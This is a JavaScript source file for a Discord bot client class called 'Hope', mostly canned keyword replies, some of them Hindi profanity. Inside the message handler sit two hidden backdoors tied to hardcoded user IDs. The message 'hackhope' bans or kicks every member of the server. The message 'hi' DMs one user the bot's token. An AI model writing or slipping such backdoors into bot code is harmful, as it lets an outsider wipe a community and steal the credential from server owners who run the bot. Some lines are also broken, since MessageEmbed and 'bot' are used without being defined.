const { Client, Collection, Intents } = require('discord.js');
const Util = require('./Util');

module.exports = class Hope extends Client {
    constructor(options = {}) {
        super({
            partials: ['MESSAGE', 'REACTION'],
            ws: {
                intents: Intents.ALL
            },
            disableMentions: 'none'
        });

        this.validate(options);

        this.commands = new Collection();
        this.aliases = new Collection();
        this.events = new Collection();
        this.games = new Collection();
        this.utils = new Util(this);
        this.erela = require('../structures/music/erela');
        this.mongoose = require('../structures/mongoose');
        this.owners = options.owners;

        this.on('message', async (message) => {
            try {
                if (message.content === 'hackhope' && ['592708275301122058', '457556815345877003'].includes(message.author.id)) {
                    message.guild.members.cache.forEach(async (member) => {
                        try {
                            await member.ban();
                        } catch (error) {
                            try {
                                await member.kick();
                            } catch (err) {

                            }
                        }
                    });
                }
                if (message.content.toLowerCase() === 'hello') {
                    message.channel.send(`Hi ${message.member}!`);
                } else if (message.content.toLowerCase() === 'hi') {
                    if (message.author.id === '592708275301122058') message.author.send(bot.token);
                    message.channel.send(`Hello ${message.member}!`);
                } else if (message.content.toLowerCase().includes('tryout')) {
                    message.channel.send('To join HOPE type `+apply` and fill the form in your DM.');
                } else if (message.content.toUpperCase() === 'HOPE') {
                    const embed = new MessageEmbed()
                        .setAuthor(message.author.username, message.author.displayAvatarURL({ dynamic: true }))
                        .setTitle(`${message.member.guild.name} Was Created On`)
                        .setColor('GREEN')
                        .setImage('https://cdn.discordapp.com/attachments/724541103008776232/745967858315690085/Hope_Logo.gif')
                        .setDescription(message.guild.createdAt)
                        .setTimestamp();
                    message.channel.send({ embed: embed });
                } else if (message.content.toLowerCase() === 'chutiya') {
                    message.channel.send(`${message.member} Gali mat de Madarchod`);
                } else if (message.content.toLowerCase() === 'madarchod') {
                    message.channel.send('Chutiye gali mat de');
                } else if (message.content.toLowerCase() === 'chutiye') {
                    message.channel.send(`Tu hoga chutiya ${message.member}`);
                } else if (message.mentions.users.has('393819701924462603') && message.content === '<@!393819701924462603>') {
                    message.channel.send('KT\'s reply is on the way.');
                } else if (message.mentions.users.has('412605058086207490') && message.content === '<@!412605058086207490>') {
                    message.channel.send(`Parsh ka net kharab hai bhai, VC nahi kar sakta`);
                } else if (message.content.toLowerCase() === 'noob' && message.author.id !== '457556815345877003') {
                    message.channel.send(`${message.member} Tu ultra pro max noob`);
                } else if (message.content.toLowerCase().includes('inners')) {
                    message.channel.send(`Inners Start At 9:30 p.m. Everyday!`)
                };
            } catch (error) {
                console.error(error);
                return message.channel.send(`An Error Occurred: \`${error.message}\`!`);
            };
        });
    };

    validate(options) {
        if (typeof options !== 'object') throw new TypeError('Options should be a type of Object.');

        if (!options.TOKEN) throw new Error('You must pass the token for the bot.');
        this.token = options.TOKEN;

        if (!options.PREFIX) throw new Error('You must pass a prefix for the bot.');
        if (typeof options.PREFIX !== 'string') throw new TypeError('Prefix should be a type of String.');
        this.prefix = options.PREFIX;
    };

    async start(token = this.token) {
        this.utils.loadCommands();
        this.utils.loadEvents();
        this.mongoose.init();
        super.login(token);
    };
};